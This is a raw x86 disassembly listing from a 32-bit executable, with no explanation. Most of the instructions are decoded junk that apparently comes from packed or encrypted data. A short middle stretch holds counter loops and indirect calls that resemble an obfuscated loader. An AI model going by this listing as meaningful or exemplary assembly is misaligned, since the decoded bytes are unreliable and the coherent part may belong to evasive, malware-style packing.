  40a301:	nop
  40a302:	dec    ebp
  40a303:	adc    ebx,DWORD PTR [ebx+0x6acd1b50]
  40a309:	push   ecx
  40a30a:	xor    bh,ch
  40a30c:	or     eax,ecx
  40a30e:	mov    bh,0x40
  40a310:	cmp    DWORD PTR [esi],edx
  40a312:	in     al,dx
  40a313:	push   ebp
  40a314:	pop    edx
  40a315:	xchg   esp,eax
  40a316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a317:	xor    ecx,0xffffffa9
  40a31a:	cmp    dl,BYTE PTR [ebx]
  40a31c:	adc    DWORD PTR [eax-0x2ed0e8c],ecx
  40a322:	ja     0x40a2ee
  40a324:	push   0x6d
  40a326:	das    
  40a327:	scas   eax,DWORD PTR es:[edi]
  40a328:	shl    esi,cl
  40a32a:	jp     0x40a2ff
  40a32c:	ins    BYTE PTR es:[edi],dx
  40a32d:	imul   DWORD PTR [esi]
  40a32f:	(bad)  
  40a330:	push   edi
  40a331:	bound  esp,QWORD PTR [edi]
  40a333:	dec    esi
  40a334:	or     edi,edi
  40a336:	lds    edx,FWORD PTR [esi*2-0x5ec775de]
  40a33d:	pusha  
  40a33e:	add    bh,ah
  40a340:	aaa    
  40a341:	lods   al,BYTE PTR ds:[esi]
  40a342:	cld    
  40a343:	xor    al,0x55
  40a345:	jmp    0x5b69f4ae
  40a34a:	jmp    0x40a39c
  40a34c:	jg     0x40a3b6
  40a34e:	stc    
  40a34f:	ficomp WORD PTR [edi]
  40a351:	stc    
  40a352:	(bad)  
  40a353:	dec    esi
  40a354:	test   DWORD PTR [esi-0x3c],ebp
  40a357:	push   es
  40a358:	ds sub eax,0x31087b6c
  40a35e:	mov    edx,0xee8a9b84
  40a363:	adc    BYTE PTR [ebx],dh
  40a365:	jg     0x40a3bf
  40a367:	pop    edx
  40a368:	push   edx
  40a369:	fisubr DWORD PTR [ecx-0x323ce501]
  40a36f:	or     eax,0x1a4b8407
  40a374:	mov    DWORD PTR [edi+0x39a1c7c2],esi
  40a37a:	pop    edi
  40a37b:	mov    al,0x3c
  40a37d:	dec    ecx
  40a37e:	pop    edi
  40a37f:	jl     0x40a3ce
  40a381:	dec    edx
  40a382:	inc    ecx
  40a383:	es (bad) 
  40a385:	mov    ebx,0x2709f6ce
  40a38a:	sbb    eax,0xc2008528
  40a38f:	pop    edi
  40a390:	push   ecx
  40a391:	dec    esi
  40a392:	ja     0x40a3fe
  40a394:	jp     0x40a3c7
  40a396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a398:	das    
  40a399:	cwde   
  40a39a:	fs xchg ebx,eax
  40a39c:	dec    eax
  40a39d:	jge    0x40a3f8
  40a39f:	jmp    0x1650:0x862c4d77
  40a3a6:	fisttp DWORD PTR [ebx]
  40a3a8:	and    dl,dh
  40a3aa:	ds inc ecx
  40a3ac:	fidiv  DWORD PTR [edi+eax*4-0x491c027d]
  40a3b3:	mov    ch,0xf0
  40a3b5:	push   0xf00c26b2
  40a3ba:	(bad)  
  40a3bb:	(bad)  
  40a3bc:	ss imul eax,DWORD PTR cs:[ecx],0x61
  40a3c1:	mov    esi,0x662f1fb
  40a3c6:	fmul   st(1),st
  40a3c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3c9:	xor    eax,DWORD PTR [esi]
  40a3cb:	bound  edi,QWORD PTR [esi+0x2a6b3a3d]
  40a3d1:	push   eax
  40a3d2:	dec    esi
  40a3d3:	mov    ds:0x8a06501a,al
  40a3d8:	ret    
  40a3d9:	loope  0x40a408
  40a3db:	ret    0xc986
  40a3de:	dec    eax
  40a3df:	int    0x90
  40a3e1:	dec    ebp
  40a3e2:	sub    ah,BYTE PTR [ebx]
  40a3e4:	lock jecxz 0x40a45f
  40a3e7:	shr    BYTE PTR [edi-0x4f2dd6c3],cl
  40a3ed:	fimul  WORD PTR [edx+eiz*8-0x2f275af3]
  40a3f4:	mov    bh,dh
  40a3f6:	cmc    
  40a3f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3f8:	push   ds
  40a3f9:	test   BYTE PTR [edx],0x1c
  40a3fc:	repnz xor bl,BYTE PTR [esi+0x21]
  40a400:	ret    0x9b02
  40a403:	xchg   ebp,ebp
  40a405:	lock cmp BYTE PTR [ecx-0xb],0xbe
  40a40a:	mov    dl,0x33
  40a40c:	in     al,dx
  40a40d:	adc    al,0xb
  40a40f:	mov    DWORD PTR [eax],ecx
  40a411:	mov    edx,0x6cefff6b
  40a416:	dec    edx
  40a417:	sub    dh,bh
  40a419:	and    dl,dh
  40a41b:	into   
  40a41c:	cmp    eax,0xefffaa93
  40a421:	sub    DWORD PTR [ebp-0x7a],0xcdb36373
  40a428:	sub    DWORD PTR [ecx-0x41],edx
  40a42b:	div    esi
  40a42d:	dec    ebp
  40a42e:	jns    0x40a3ca
  40a430:	inc    ebp
  40a431:	and    al,0x68
  40a433:	jbe    0x40a492
  40a435:	adc    al,0xec
  40a437:	(bad)  
  40a438:	repnz int3 
  40a43a:	adc    eax,0x61e9204f
  40a43f:	push   esi
  40a440:	jne    0x40a498
  40a442:	je     0x40a48a
  40a444:	push   edi
  40a445:	sub    eax,0xb2bfd594
  40a44a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a44b:	push   0x11ead19a
  40a450:	jns    0x40a3de
  40a452:	gs dec esi
  40a454:	(bad)  
  40a455:	scas   al,BYTE PTR es:[edi]
  40a456:	and    eax,0xbc399c8c
  40a45b:	(bad)  
  40a45c:	out    dx,eax
  40a45d:	into   
  40a45e:	or     DWORD PTR [eax-0x75331bf1],edx
  40a464:	ds loopne 0x40a49f
  40a467:	and    edi,DWORD PTR [eax+edx*4-0x554da513]
  40a46e:	mov    dl,0x89
  40a470:	mov    dl,dl
  40a472:	and    eax,0xf08aa510
  40a477:	dec    eax
  40a478:	(bad)  
  40a479:	sbb    eax,0xf38d7661
  40a47e:	mov    eax,ds:0xb214e520
  40a483:	jb     0x40a4e2
  40a485:	stos   DWORD PTR es:[edi],eax
  40a486:	mov    ecx,0xc7da1aee
  40a48b:	push   ss
  40a48c:	jmp    0x5c3207dc
  40a491:	pop    ss
  40a492:	jmp    0x989d:0x59eb28c8
  40a499:	mov    bl,0x8f
  40a49b:	or     DWORD PTR [esi-0x701b1480],edx
  40a4a1:	retf   0x8fa0
  40a4a4:	fisubr WORD PTR [eax-0x2fd11ebf]
  40a4aa:	add    BYTE PTR [ecx-0x5be8cd7e],bh
  40a4b0:	mov    edx,0x6324b346
  40a4b5:	inc    esi
  40a4b6:	fld    DWORD PTR [edx-0x4b]
  40a4b9:	xor    BYTE PTR [eax-0x5d],dl
  40a4bc:	or     edi,DWORD PTR [ebp+0x5e7f93af]
  40a4c2:	popf   
  40a4c3:	jl     0x40a4cf
  40a4c5:	fadd   QWORD PTR [edi]
  40a4c7:	(bad)  
  40a4c8:	aad    0xe9
  40a4ca:	pop    ecx
  40a4cb:	aas    
  40a4cc:	fiadd  DWORD PTR [ebx-0x16d9aa41]
  40a4d2:	imul   eax,DWORD PTR [ecx],0xffffffbd
  40a4d5:	cmp    bl,BYTE PTR [ebx]
  40a4d7:	xrelease xchg DWORD PTR [eax-0x7b948915],edi
  40a4de:	pop    ecx
  40a4df:	xor    BYTE PTR [ebp-0x3ef0ec63],0x53
  40a4e6:	xor    eax,0x4807a169
  40a4eb:	dec    ebp
  40a4ec:	out    0xbe,al
  40a4ee:	fbld   TBYTE PTR [edi-0x12]
  40a4f1:	mov    dh,0x3a
  40a4f3:	and    al,0xa4
  40a4f5:	aam    0x92
  40a4f7:	mov    dh,0x7b
  40a4f9:	(bad)  
  40a4fa:	or     eax,DWORD PTR [edi]
  40a4fc:	cmp    BYTE PTR [eax+0x31],bl
  40a4ff:	int    0xac
  40a501:	cmp    BYTE PTR [edi],ah
  40a503:	ins    BYTE PTR es:[edi],dx
  40a504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a505:	fsubr  DWORD PTR [eax+0x5]
  40a508:	xor    ecx,esi
  40a50a:	int    0xb6
  40a50c:	idiv   ecx
  40a50e:	push   0x3044f46f
  40a513:	push   0xffffffec
  40a515:	push   esi
  40a516:	das    
  40a517:	pop    edi
  40a518:	mov    dl,0xd7
  40a51a:	push   ebx
  40a51b:	push   ebx
  40a51c:	xor    eax,DWORD PTR [eax+ebp*1+0x562e1627]
  40a523:	repz adc BYTE PTR [ebx],dh
  40a526:	mov    edx,0xc165d125
  40a52b:	arpl   WORD PTR [edi-0x72],sp
  40a52e:	xchg   edx,eax
  40a52f:	or     ch,dl
  40a531:	adc    ebp,DWORD PTR [ecx+0x41]
  40a534:	xor    BYTE PTR [edx+0x3e],0x1
  40a538:	cwde   
  40a539:	jle    0x40a502
  40a53b:	iret   
  40a53c:	and    BYTE PTR [eax],0x9e
  40a53f:	rol    DWORD PTR [edx-0x397fa2c2],0xdc
  40a546:	aas    
  40a547:	jg     0x40a58b
  40a549:	xlat   BYTE PTR ds:[ebx]
  40a54a:	(bad)  [edi+0x8]
  40a54d:	mov    dh,0xc6
  40a54f:	aaa    
  40a550:	sub    BYTE PTR [ebx+0x5d1c251a],cl
  40a556:	clc    
  40a557:	inc    esi
  40a558:	jno    0x40a595
  40a55a:	adc    bl,0x39
  40a55d:	daa    
  40a55e:	jne    0x40a58f
  40a560:	add    eax,0x35125096
  40a565:	mov    ?,WORD PTR ds:0x63f04f56
  40a56b:	cmc    
  40a56c:	mov    ebp,0xb112ef5b
  40a571:	daa    
  40a572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a573:	pop    edi
  40a574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a575:	into   
  40a576:	dec    ax
  40a578:	leave  
  40a579:	rol    BYTE PTR [ebx-0x67],0x92
  40a57d:	sub    edi,DWORD PTR [ebx]
  40a57f:	es dec edx
  40a581:	das    
  40a582:	adc    DWORD PTR [edi+0x5],0x49f35c8a
  40a589:	pop    ecx
  40a58a:	fnstenv [edi-0x16]
  40a58d:	imul   esi
  40a58f:	sub    ebp,DWORD PTR [esi-0x7d]
  40a592:	fnstenv [eax+0x3cf0ff1d]
  40a598:	xchg   ebx,eax
  40a599:	sbb    al,0xe9
  40a59b:	outs   dx,DWORD PTR ds:[esi]
  40a59c:	cdq    
  40a59d:	lods   eax,DWORD PTR ds:[esi]
  40a59e:	in     al,0xbb
  40a5a0:	retf   0x98b3
  40a5a3:	in     al,0x6
  40a5a5:	ss test eax,0xd042afa3
  40a5ab:	es int3 
  40a5ad:	pusha  
  40a5ae:	mov    ecx,0xe3f6990d
  40a5b3:	sbb    ebp,DWORD PTR [ebx+0x240f4369]
  40a5b9:	(bad)  
  40a5ba:	mov    ds:0x910898f7,eax
  40a5bf:	cli    
  40a5c0:	sub    dh,BYTE PTR [ebx+edi*2]
  40a5c3:	sub    eax,0x4661da84
  40a5c8:	stos   BYTE PTR es:[edi],al
  40a5c9:	sub    DWORD PTR [edx+0x4f543194],eax
  40a5cf:	popf   
  40a5d0:	ins    BYTE PTR es:[edi],dx
  40a5d1:	arpl   WORD PTR [edx-0x177ac163],ax
  40a5d7:	push   0x4d
  40a5d9:	into   
  40a5da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5db:	pop    es
  40a5dc:	sbb    edx,edx
  40a5de:	dec    esp
  40a5df:	out    dx,eax
  40a5e0:	jae    0x40a5dd
  40a5e2:	or     dh,BYTE PTR [edx]
  40a5e4:	lock add al,0xd0
  40a5e7:	fdiv   DWORD PTR [edx+0x3b184aaa]
  40a5ed:	cmp    ecx,DWORD PTR [ebp+edi*1+0x78]
  40a5f1:	mov    bh,0x25
  40a5f3:	ins    DWORD PTR es:[edi],dx
  40a5f4:	mov    WORD PTR [ecx+0x2a65a093],?
  40a5fa:	test   BYTE PTR [eax+ebx*4+0x62fd8079],0x50
  40a602:	test   ebp,eax
  40a604:	xchg   DWORD PTR [edx+0x2d],esi
  40a607:	lods   al,BYTE PTR ds:[esi]
  40a608:	(bad)  
  40a609:	aad    0xbc
  40a60b:	cmp    DWORD PTR [ebx+0x8],0x856361b0
  40a612:	mov    al,0x1e
  40a614:	(bad)  
  40a615:	iret   
  40a616:	fwait
  40a617:	mov    edi,0x3857c87c
  40a61c:	aaa    
  40a61d:	stos   DWORD PTR es:[edi],eax
  40a61e:	mov    esi,DWORD PTR [eax-0x50]
  40a621:	enter  0x6dbf,0x13
  40a625:	nop
  40a626:	fs sbb ebx,esi
  40a629:	retf   
  40a62a:	mov    esp,0xae3bb1e7
  40a62f:	retf   0xaae5
  40a632:	cs push es
  40a634:	and    esi,DWORD PTR [ebp-0x69]
  40a637:	jecxz  0x40a609
  40a639:	pop    ecx
  40a63a:	inc    edi
  40a63b:	pop    edx
  40a63c:	inc    eax
  40a63d:	call   0x71bd:0x346d1474
  40a644:	imul   edi,DWORD PTR [edx],0x5d
  40a647:	push   es
  40a648:	jecxz  0x40a616
  40a64a:	sbb    BYTE PTR [ebx+0x4c],dl
  40a64d:	ret    
  40a64e:	lahf   
  40a64f:	fsubr  DWORD PTR [ebx-0x4d1e4966]
  40a655:	mov    DWORD PTR [ebx+0x6d],edx
  40a658:	jno    0x40a689
  40a65a:	xchg   ebx,eax
  40a65b:	mov    BYTE PTR [ecx+0x41b67ca4],bl
  40a661:	or     al,0x55
  40a663:	jo     0x40a668
  40a665:	retf   
  40a666:	cmp    bl,bh
  40a668:	cmp    al,0xd4
  40a66a:	(bad)  
  40a66d:	inc    edx
  40a66e:	je     0x40a619
  40a670:	and    eax,0x3ccc45c7
  40a675:	test   DWORD PTR [eax+edi*8+0x3fc845c7],ebx
  40a67c:	test   DWORD PTR [eax+edi*8-0x1890da7f],ebx
  40a683:	inc    edx
  40a684:	add    BYTE PTR [eax],al
  40a686:	add    BYTE PTR [eax],al
  40a688:	add    BYTE PTR [ebx],dh
  40a68a:	ror    BYTE PTR [ebx],cl
  40a68c:	adc    eax,0x42e76f
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e76f,edx
  40a698:	cmp    DWORD PTR ds:0x42e76f,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e777
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e36b
  40a6c6:	cmp    DWORD PTR ds:0x42e76f,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e76f
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e76f,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e76f,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fd5d,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fd5d
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fd5d,edx
  40a709:	cmp    DWORD PTR ds:0x42fd5d,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fd5d,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e2ed
  40a728:	push   0x42e2db
  40a72d:	call   DWORD PTR ds:0x42e5c7
  40a733:	cmp    DWORD PTR ds:0x42fd5d,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fd5d
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fd5d,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e1b4
  40a75a:	xor    edi,DWORD PTR ds:0x42e793
  40a760:	mov    DWORD PTR ds:0x42e1b4,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e793,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fd51
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fd65,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e793,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fd79,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd89,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e1b0,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e1b0,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e1b0,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e267
  40a7e8:	push   0x42e2bd
  40a7ed:	push   0x42e2bd
  40a7f2:	call   DWORD PTR ds:0x42e36f
  40a7f8:	cmp    DWORD PTR ds:0x42e1b0,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e1b0
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e1b0,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e1b0
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e1b0,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e1ac,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fdee
  40a839:	add    DWORD PTR ds:0x42e787,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	and    cl,BYTE PTR [eax]
  40a855:	mov    ds:0x70f1e419,al
  40a85a:	jo     0x40a7fb
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a854
  40a860:	push   ebp
  40a861:	jo     0x40a82e
  40a863:	stos   BYTE PTR es:[edi],al
  40a864:	in     al,dx
  40a865:	sub    DWORD PTR [edx+0x4d],edi
  40a868:	icebp  
  40a869:	cmp    cl,BYTE PTR [edx+ecx*8-0xa]
  40a86d:	and    BYTE PTR [esi-0x66598e50],ah
  40a873:	inc    esp
  40a874:	out    0x1e,al
  40a876:	mov    DWORD PTR [ebp+0x473dcc93],0x622c681b
  40a880:	loop   0x40a89c
  40a882:	fimul  WORD PTR [ecx+0x28]
  40a885:	inc    ecx
  40a886:	mov    eax,0xf85bcab4
  40a88b:	int    0xfb
  40a88d:	jnp    0x40a863
  40a88f:	dec    ebp
  40a890:	cmp    esi,ebp
  40a892:	imul   ecx,DWORD PTR [eax-0x31],0x5f02e310
  40a899:	inc    esp
  40a89a:	sahf   
  40a89b:	cmp    BYTE PTR [eax+0x1],dh
  40a89e:	sbb    BYTE PTR [edi],dl
  40a8a0:	adc    eax,0x718dec3a
  40a8a5:	and    al,0x8
  40a8a7:	or     ecx,DWORD PTR [ecx-0x74]
  40a8aa:	push   esi
  40a8ab:	mov    ds:0x95a00895,eax
  40a8b0:	leave  
  40a8b1:	pop    eax
  40a8b2:	pusha  
  40a8b3:	xor    al,0x15
  40a8b5:	ins    DWORD PTR es:[edi],dx
  40a8b6:	adc    DWORD PTR [ebx-0x746e9d5f],eax
  40a8bc:	dec    ebp
  40a8bd:	pop    edi
  40a8be:	ins    BYTE PTR es:[edi],dx
  40a8bf:	in     eax,0x1a
  40a8c1:	add    eax,0x8306a8c1
  40a8c6:	fs sbb eax,0x566ce21c
  40a8cc:	fdiv   QWORD PTR [ebx+0x56]
  40a8cf:	sbb    al,0x5f
  40a8d1:	push   edx
  40a8d2:	push   edx
  40a8d3:	add    al,0x54
  40a8d5:	scas   al,BYTE PTR es:[edi]
  40a8d6:	mov    dh,bh
  40a8d8:	int    0x30
  40a8da:	call   0x904a920f
  40a8df:	jnp    0x40a86d
  40a8e1:	lods   al,BYTE PTR ds:[esi]
  40a8e2:	jle    0x40a899
  40a8e4:	mov    ebx,0x3dd61832
  40a8e9:	call   0x1734:0x759842c4
  40a8f0:	punpckhdq mm1,QWORD PTR [edi-0x78]
  40a8f4:	cwde   
  40a8f5:	adc    al,0x91
  40a8f7:	(bad)  
  40a8f8:	mov    DWORD PTR [ebp+0x6a],eax
  40a8fb:	out    0x6e,eax
  40a8fd:	jle    0x40a887
  40a8ff:	xor    DWORD PTR [edi],ebx
  40a901:	inc    ebp
  40a902:	ins    DWORD PTR es:[edi],dx
  40a903:	dec    ecx
  40a904:	cli    
  40a905:	mov    WORD PTR [edx+edx*8+0x11],?
  40a909:	inc    edx
  40a90a:	mov    eax,ds:0xa8c908e8
  40a90f:	mov    ds,WORD PTR [esi]
  40a911:	dec    ebp
  40a912:	jle    0x40a912
  40a914:	xchg   edi,eax
  40a915:	cdq    
  40a916:	fidivr DWORD PTR [ebp+0x6bc2a37d]
  40a91c:	add    DWORD PTR ds:0x76750da3,ecx
  40a922:	mov    al,cl
  40a924:	rcr    BYTE PTR [edx+0x7217351f],0xff
  40a92b:	fdiv   QWORD PTR [ebp+0x7372cb32]
  40a931:	cmp    BYTE PTR fs:[ecx],0xf9
  40a935:	sar    BYTE PTR [edx-0x76],0x1f
  40a939:	mov    es,WORD PTR [edx-0x5c861df1]
  40a93f:	dec    edi
  40a940:	rcr    DWORD PTR [esi+0x1add3567],0x44
  40a947:	repz cmp eax,0x9cc7c19a
  40a94d:	data16 shl BYTE PTR [edx+0x7a],0x15
  40a952:	pop    ebx
  40a953:	int    0xa
  40a955:	(bad)  
  40a956:	out    0xd4,eax
  40a958:	in     eax,dx
  40a959:	sub    DWORD PTR [ecx+0x62],0xffffffc8
  40a95d:	mov    BYTE PTR [edx],dl
  40a95f:	sub    DWORD PTR [ebx],edx
  40a961:	neg    BYTE PTR [esi+0x1c]
  40a964:	push   eax
  40a965:	push   ebx
  40a966:	mov    ecx,0xe33694cf
  40a96b:	(bad)  
  40a96c:	sar    BYTE PTR [ebp-0x4d],1
  40a96f:	push   ebx
  40a970:	retf   
  40a971:	pop    edi
  40a972:	imul   ebp,DWORD PTR [esi+0x14],0x43
  40a976:	mov    ecx,0x49349593
  40a97b:	ret    
  40a97c:	dec    ebp
  40a97d:	push   ebp
  40a97e:	inc    eax
  40a97f:	and    ecx,ebp
  40a981:	mov    ch,BYTE PTR [ebp+0x19b1ee70]
  40a987:	mov    al,0x32
  40a989:	xchg   edi,eax
  40a98a:	test   eax,0x6de4db0
  40a98f:	push   eax
  40a990:	jmp    0x196c:0x177db260
  40a997:	mov    ecx,0xbec53726
  40a99c:	or     eax,0x6049ab38
  40a9a1:	je     0x40a989
  40a9a3:	dec    edi
  40a9a4:	jno    0x40a95b
  40a9a6:	push   edx
  40a9a7:	dec    eax
  40a9a8:	pop    ebx
  40a9a9:	adc    ah,BYTE PTR [ecx+0x2a38642c]
  40a9af:	pop    esi
  40a9b0:	and    al,0x4a
  40a9b2:	push   esi
  40a9b3:	sub    BYTE PTR [edx+0x4],dh
  40a9b6:	sti    
  40a9b7:	dec    edx
  40a9b8:	scas   al,BYTE PTR es:[edi]
  40a9b9:	push   edx
  40a9ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9bb:	sbb    bl,BYTE PTR [ebp+0x77]
  40a9be:	dec    esp
  40a9bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9c0:	mov    cl,0x1c
  40a9c2:	scas   eax,DWORD PTR es:[edi]
  40a9c3:	adc    al,0x3c
  40a9c5:	jmp    0x7946:0xa2feaddc
  40a9cc:	sub    dl,BYTE PTR [ebx+0x37]
  40a9cf:	stc    
  40a9d0:	scas   eax,DWORD PTR es:[edi]
  40a9d1:	mov    esp,0x33ca0954
  40a9d6:	xchg   ecx,eax
  40a9d7:	mov    eax,0xd093b6b1
  40a9dc:	jp     0x40aa4e
  40a9de:	int3   
  40a9df:	ja     0x40a965
  40a9e1:	scas   al,BYTE PTR es:[edi]
  40a9e2:	stos   DWORD PTR es:[edi],eax
  40a9e3:	inc    edx
  40a9e4:	pop    eax
  40a9e5:	hlt    
  40a9e6:	fldenv [ebp+0x3111daf1]
  40a9ec:	xchg   DWORD PTR [edi-0x77],ecx
  40a9ef:	js     0x40a9ff
  40a9f1:	dec    esp
  40a9f2:	lds    esp,FWORD PTR [ebp-0x4c027c9]
  40a9f8:	mov    bl,BYTE PTR ds:0xc2589d53
  40a9fe:	push   cs
  40a9ff:	pop    ds
  40aa00:	dec    ecx
  40aa01:	dec    eax
  40aa02:	and    eax,0xf6ba995b
  40aa07:	jp     0x40aa2f
  40aa09:	dec    edi
  40aa0a:	jae    0x40aa0b
  40aa0c:	mov    dl,0x56
  40aa0e:	mov    ah,0x6e
  40aa10:	adc    BYTE PTR [ecx],dl
  40aa12:	push   esp
  40aa13:	dec    edi
  40aa14:	lods   eax,DWORD PTR ds:[esi]
  40aa15:	push   esp
  40aa16:	ins    DWORD PTR es:[edi],dx
  40aa17:	mov    edi,?
  40aa19:	pop    esp
  40aa1a:	mov    BYTE PTR [edx+edx*4],ch
  40aa1d:	ins    BYTE PTR es:[edi],dx
  40aa1e:	rcl    BYTE PTR [ecx+0x16],0x9f
  40aa22:	retf   
  40aa23:	ins    BYTE PTR es:[edi],dx
  40aa24:	and    ebp,0x45
  40aa27:	int    0x49
  40aa29:	pop    ebx
  40aa2a:	and    DWORD PTR [ebx+0xd609ac6],edx
  40aa30:	jge    0x40aa4c
  40aa32:	push   ebp
  40aa33:	shl    DWORD PTR [edx+0x41088326],1
  40aa39:	sub    esi,esi
  40aa3b:	repz cwde 
  40aa3d:	pop    ebx
  40aa3e:	xlat   BYTE PTR ds:[ebx]
  40aa3f:	cdq    
  40aa40:	bound  esp,QWORD PTR [eax]
  40aa42:	(bad)  
  40aa43:	out    dx,eax
  40aa44:	or     BYTE PTR [edx],dl
  40aa46:	call   0x3a66:0xfb435ce0
  40aa4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa4e:	or     eax,0xeec9a76d
  40aa53:	(bad)  [esi+0x2f0352d2]
  40aa59:	jno    0x40a9e0
  40aa5b:	dec    ebp
  40aa5c:	push   ebx
  40aa5d:	ret    
  40aa5e:	pop    ebx
  40aa5f:	adc    DWORD PTR [esi+ebx*2],esp
  40aa62:	ret    
  40aa63:	scas   eax,DWORD PTR es:[edi]
  40aa64:	mov    dh,0xa7
  40aa66:	jmp    0xbfde897a
  40aa6b:	adc    ah,BYTE PTR [edi+0x52d4013a]
  40aa71:	push   0xffffffaf
  40aa73:	mov    ebp,0x3c396a4d
  40aa78:	pop    esp
  40aa79:	dec    ecx
  40aa7a:	dec    ecx
  40aa7b:	add    DWORD PTR [eax-0x47bcda86],0x2424ca64
  40aa85:	imul   ebp,DWORD PTR [eax],0xcc5a2dc9
  40aa8b:	test   edx,esp
  40aa8d:	mov    ebx,0xf7629674
  40aa92:	retf   0x1d78
  40aa95:	enter  0x80b3,0xff
  40aa99:	ret    
  40aa9a:	push   ds
  40aa9b:	pop    ebp
  40aa9c:	jae    0x40aa4b
  40aa9e:	mov    edi,0xdab1d48e
  40aaa3:	mov    ds:0x383437e7,al
  40aaa8:	inc    esi
  40aaa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaaa:	sub    ebp,eax
  40aaac:	mov    al,0xbf
  40aaae:	test   ebp,0x7f9e86e0
  40aab4:	pop    eax
  40aab5:	icebp  
  40aab6:	add    DWORD PTR [esi],0xffffffc4
  40aab9:	and    al,0xbd
  40aabb:	sub    eax,0xf4e604d
  40aac0:	jl     0x40ab16
  40aac2:	(bad)  [edi-0xcaba2e8]
  40aac8:	sbb    dh,BYTE PTR ds:0xb4de5504
  40aace:	shl    BYTE PTR [esi-0x2a],1
  40aad1:	call   0xe111:0x8ef64644
  40aad8:	dec    esi
  40aad9:	out    dx,eax
  40aada:	nop
  40aadb:	mov    edx,0x6e7968cc
  40aae0:	jg     0x40ab0f
  40aae2:	push   edx
  40aae3:	jb     0x40ab61
  40aae5:	adc    eax,0xc3d56163
  40aaea:	pop    gs
  40aaec:	imul   eax,DWORD PTR [ebx+eiz*1],0x837f6285
  40aaf3:	add    BYTE PTR [edi-0x4fc32f5a],dl
  40aaf9:	enter  0x7dcf,0x62
  40aafd:	es jecxz 0x40aa9e
  40ab00:	or     BYTE PTR [eax-0x4a],0x8d
  40ab04:	scas   al,BYTE PTR es:[edi]
  40ab05:	nop
  40ab06:	pop    esp
  40ab07:	inc    ecx
  40ab08:	(bad)  
  40ab0a:	dec    esp
  40ab0b:	or     al,cl
  40ab0d:	aam    0x86
  40ab0f:	xchg   ebp,eax
  40ab10:	pop    ebx
  40ab11:	cmp    eax,0xcdd794ea
  40ab16:	jnp    0x40ab28
  40ab18:	mov    ah,0xe6
  40ab1a:	dec    esp
  40ab1b:	mov    dl,0x9a
  40ab1d:	test   eax,0xce574ed8
  40ab22:	cmp    eax,0xc1ac8362
  40ab27:	call   0x91ee20d1
  40ab2c:	retf   
  40ab2d:	enter  0x51f,0x9b
  40ab31:	imul   ebp,DWORD PTR [edx-0x3d4c8794],0x57338c8
